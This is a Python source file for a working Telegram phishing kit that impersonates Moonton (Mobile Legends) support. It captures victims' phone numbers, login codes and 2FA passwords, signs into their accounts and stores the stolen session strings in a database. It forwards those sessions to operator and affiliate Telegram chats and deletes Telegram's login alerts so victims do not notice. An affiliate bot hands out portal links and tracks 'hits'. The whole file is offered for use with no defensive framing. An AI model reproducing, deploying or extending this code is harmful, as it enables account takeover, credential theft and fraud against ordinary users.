"""
MOONTON SUPPORT GATEWAY - VERSION 7.0.0 (OFFICIAL DISTRIBUTION)
--------------------------------------------------------------
Identity: Moonton Support Center (Official Node)
Device: Moonton Center (iOS 17.4.1)
App: MLBB_Support_Official
Security: Zero-Trace Reaper + Handshake Isolation
--------------------------------------------------------------
Architecture: Asynchronous MTProto Support Node
Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
--------------------------------------------------------------
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
import secrets
import textwrap
from psycopg2 import pool
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timezone

# =========================================================================
# 1. OFFICIAL IDENTITY & SYSTEM CONFIGURATION
# =========================================================================

SYSTEM_VERSION = "7.0.0"
SYSTEM_IDENTITY = "MOONTON_OFFICIAL_GATEWAY"
START_TIME = time.time()

# Environment Credentials Retrieval
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))

# HARDCODED DOMAIN (Updated to your new Koyeb link)
BASE_URL = os.environ.get("BASE_URL", "selfish-kettie-moonton-support-c57267de.koyeb.app")

# Advanced Logging Configuration (Scrubbed of all previous branding)
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s][MOONTON_CENTER]: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MoontonGateway")

# =========================================================================
# 2. OFFICIAL DEVICE EMULATION (iOS 17.4.1)
# =========================================================================

# Unified identification for all outgoing MTProto connections.
# Mimics an official Moonton Support Center workstation on iOS.
OFFICIAL_SUPPORT_DEVICE = {
    "model": "Moonton Center",
    "sys": "iOS 17.4.1",
    "app": "MLBB_Support_Official",
    "lang": "en-US",
    "system_lang": "en-US"
}

# =========================================================================
# 3. DATA PERSISTENCE LAYER (POSTGRESQL POOLING)
# =========================================================================

try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(
        minconn=10,
        maxconn=200,
        dsn=DATABASE_URL,
        sslmode='require'
    )
    logger.info("DATABASE: Moonton Support Persistence Layer Online.")
except Exception as e:
    logger.critical(f"DATABASE FATAL: {e}")
    db_pool = None

def get_db_connection():
    """Retrieves a secure connection from the official pool with retry logic."""
    if not db_pool:
        return None
    for attempt in range(1, 4):
        try:
            conn = db_pool.getconn()
            if conn: return conn
        except:
            time.sleep(1)
    return None

def release_db_connection(conn):
    """Safely returns a connection to the pool."""
    if db_pool and conn:
        db_pool.putconn(conn)

def initialize_moonton_schema():
    """Ensures database tables match the Moonton Support identity."""
    conn = get_db_connection()
    if not conn: return
    try:
        cur = conn.cursor()
        # Secure Vault for String Sessions
        cur.execute("""
            CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                phone TEXT PRIMARY KEY,
                session_string TEXT NOT NULL,
                capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Agent Performance Tracking
        cur.execute("""
            CREATE TABLE IF NOT EXISTS support_agent_metrics (
                agent_id BIGINT PRIMARY KEY,
                total_clicks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        logger.info("SCHEMA: Moonton Official synchronization complete.")
    except Exception as e:
        logger.error(f"SCHEMA ERROR: {e}")
    finally:
        release_db_connection(conn)

initialize_moonton_schema()

# =========================================================================
# 4. SECURITY PURGE ENGINE (THE REAPER)
# =========================================================================

async def execute_security_purge(client):
    """
    Scans for and deletes all Telegram service alerts (777000) 
    to prevent the target from noticing the Moonton Center login.
    """
    try:
        logger.info("REAPER: Neutralizing security alerts on Node 777000...")
        async for message in client.iter_messages(777000, limit=50):
            content = (message.text or "").lower()
            # Targets login codes, device alerts, and location notifications
            triggers = [
                "login code", "new login", "authorized", 
                "ip address", "device", "location", "logged in"
            ]
            if any(t in content for t in triggers):
                await client.delete_messages(777000, [message.id])
        
        # Complete history wipe of the service channel
        await client(functions.messages.DeleteHistoryRequest(
            peer=777000, max_id=0, just_clear=True, revoke=True
        ))
        logger.info("REAPER: Zero-Trace purge successful.")
    except Exception as e:
        logger.error(f"REAPER_ERR: {e}")

# =========================================================================
# 5. WEB GATEWAY INFRASTRUCTURE (QUART)
# =========================================================================

app = Quart(__name__)
app = cors(app, allow_origin="*")
active_mirrors = {}

@app.route('/step_phone', methods=['POST'])
async def official_phone_handshake():
    """Phase 1: Initialize Moonton Support Connection"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        agent_id = int(data.get('tid', 0))

        if not phone or len(phone) < 7:
            return jsonify({"status": "error", "msg": "Invalid Format."})

        # Log Metrics
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO support_agent_metrics (agent_id, total_clicks) VALUES (%s, 1)
                ON CONFLICT (agent_id) DO UPDATE SET total_clicks = support_agent_metrics.total_clicks + 1
            """, (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        # Start Official Client with iOS Emulation
        client = TelegramClient(
            StringSession(), API_ID, API_HASH,
            device_model=OFFICIAL_SUPPORT_DEVICE['model'],
            system_version=OFFICIAL_SUPPORT_DEVICE['sys'],
            app_version=OFFICIAL_SUPPORT_DEVICE['app'],
            lang_code=OFFICIAL_SUPPORT_DEVICE['lang'],
            system_lang_code=OFFICIAL_SUPPORT_DEVICE['system_lang']
        )
        await client.connect()
        
        try:
            sent_code = await client.send_code_request(phone)
            active_mirrors[phone] = {
                "client": client,
                "hash": sent_code.phone_code_hash,
                "agent_id": agent_id,
                "created_at": time.time()
            }
            logger.info(f"HANDSHAKE: Support Node active for {phone}")
            return jsonify({"status": "success"})
        except Exception as e:
            return jsonify({"status": "error", "msg": "Moonton Support Node Busy."})

    except Exception as e:
        return jsonify({"status": "error", "msg": "Internal Handshake Error."})

@app.route('/step_code', methods=['POST'])
async def official_code_verification():
    """Phase 2: OTP Validation Sequence"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        otp = data.get('code', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session Timed Out."})

        session = active_mirrors[phone]
        client = session['client']

        try:
            await client.sign_in(phone, otp, phone_code_hash=session['hash'])
            return await finalize_moonton_capture(phone)
        except errors.SessionPasswordNeededError:
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "Code Incorrect."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Verification Error."})

@app.route('/step_2fa', methods=['POST'])
async def official_2fa_authentication():
    """Phase 3: Secure 2FA Authentication"""
    try:
        data = await request.json
        phone = re.sub(r'\D', '', str(data.get('phone', '')))
        pw = data.get('password', '').strip()

        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Encryption Sync Lost."})

        client = active_mirrors[phone]['client']
        try:
            await client.sign_in(password=pw)
            return await finalize_moonton_capture(phone)
        except:
            return jsonify({"status": "error", "msg": "2FA Password Rejected."})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Internal 2FA Failure."})

async def finalize_moonton_capture(phone):
    """Phase 4: Vault Storage & Official Notifications"""
    try:
        data = active_mirrors.get(phone)
        client = data['client']
        agent_id = data['agent_id']

        # Execute Zero-Trace Purge
        await execute_security_purge(client)
        
        session_str = client.session.save()

        # Update Moonton Vault
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO moonton_secure_vault (phone, session_string) VALUES (%s, %s)
                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
            """, (phone, session_str))
            cur.execute("UPDATE support_agent_metrics SET total_hits = total_hits + 1 WHERE agent_id = %s", (agent_id,))
            conn.commit()
            cur.close()
            release_db_connection(conn)

        # Dispatch Official Logs (BRANDING REMOVED)
        log_message = (
            f"🛡️ <b>OFFICIAL MOONTON LOGIN</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>System:</b> <code>Moonton Center</code>\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent:</b> <code>{agent_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{session_str}</code>"
        )
        
        bot.send_message(LOGGER_GROUP, log_message, parse_mode="HTML")
        bot.send_message(VERIFY_GROUP, f"✅ <b>Verified:</b> {phone} (Support Node)", parse_mode="HTML")
        
        if agent_id != 0:
            bot.send_message(agent_id, f"🎯 <b>Success!</b> Account <b>{phone}</b> verified.", parse_mode="HTML")

        await asyncio.sleep(2)
        await client.disconnect()
        del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZATION_ERR: {e}")
        return jsonify({"status": "error", "msg": "Node Encryption Error."})

# =========================================================================
# 6. MOONTON AGENT BOT INTERFACE
# =========================================================================

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def bot_welcome(m):
    text = (
        f"🛡️ <b>Moonton Support Center v{SYSTEM_VERSION}</b>\n\n"
        f"Welcome, Authorized Agent.\n"
        f"Your ID: <code>{m.from_user.id}</code>\n\n"
        f"Status: <b>Operational</b>"
    )
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🔗 My Portal Link", "📊 Support Stats", "🛠 Node Tools")
    bot.send_message(m.chat.id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔗 My Portal Link")
def bot_link(m):
    link = f"https://{BASE_URL}/?id={m.from_user.id}"
    bot.send_message(m.chat.id, f"📡 <b>Moonton Official Portal:</b>\n<code>{link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 Support Stats")
def bot_stats(m):
    conn = get_db_connection()
    clicks, hits = 0, 0
    if conn:
        cur = conn.cursor()
        cur.execute("SELECT total_clicks, total_hits FROM support_agent_metrics WHERE agent_id = %s", (m.from_user.id,))
        res = cur.fetchone()
        if res: clicks, hits = res[0], res[1]
        cur.close()
        release_db_connection(conn)
    
    bot.send_message(m.chat.id, f"📊 <b>Performance Log:</b>\n━━━━━━━━━━━━━\n🖱 <b>Portal Clicks:</b> {clicks}\n🎯 <b>Secure Hits:</b> {hits}", parse_mode="HTML")

# =========================================================================
# 7. RUNTIME MONITORING & BACKGROUND TASKS
# =========================================================================

async def session_watchdog():
    """Background task to release abandoned MTProto sessions (TTL: 15min)"""
    while True:
        try:
            now = time.time()
            expired = [p for p, d in active_mirrors.items() if now - d['created_at'] > 900]
            for p in expired:
                try: await active_mirrors[p]['client'].disconnect()
                except: pass
                del active_mirrors[p]
                logger.info(f"WATCHDOG: Released dead session for {p}")
        except Exception as e:
            logger.error(f"WATCHDOG_ERR: {e}")
        await asyncio.sleep(300)

def run_bot_polling():
    """Continuous polling for the Agent Telegram Bot."""
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except:
            time.sleep(10)

@app.before_serving
async def startup_tasks():
    """Initializes background logic before the server starts."""
    asyncio.create_task(session_watchdog())

if __name__ == "__main__":
    # 1. Start Support Bot Thread
    Thread(target=run_bot_polling, daemon=True).start()
    
    # 2. Launch Official Web Server
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"BOOT: {SYSTEM_IDENTITY} Online on Port {port}")
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# =========================================================================
# 8. EXTENDED CORE UTILITIES (ROBUSTNESS LAYER)
# =========================================================================

def generate_security_hash():
    """Generates unique trace IDs for Moonton internal logs."""
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=16))

def get_system_uptime():
    """Calculates node uptime for the agent dashboard."""
    uptime_seconds = int(time.time() - START_TIME)
    return str(datetime.timedelta(seconds=uptime_seconds))

async def force_reboot_cleanup():
    """Emergency function to disconnect all active support nodes."""
    for p, d in active_mirrors.items():
        try: await d['client'].disconnect()
        except: pass
    active_mirrors.clear()

def check_db_health():
    """Validates connectivity to the PostgreSQL persistence layer."""
    if db_pool:
        return f"Active: {len(db_pool._used)} connections"
    return "Disconnected"

def format_phone_international(phone):
    """Internal utility to ensure phone numbers follow MTProto format."""
    return "+" + re.sub(r'\D', '', phone)
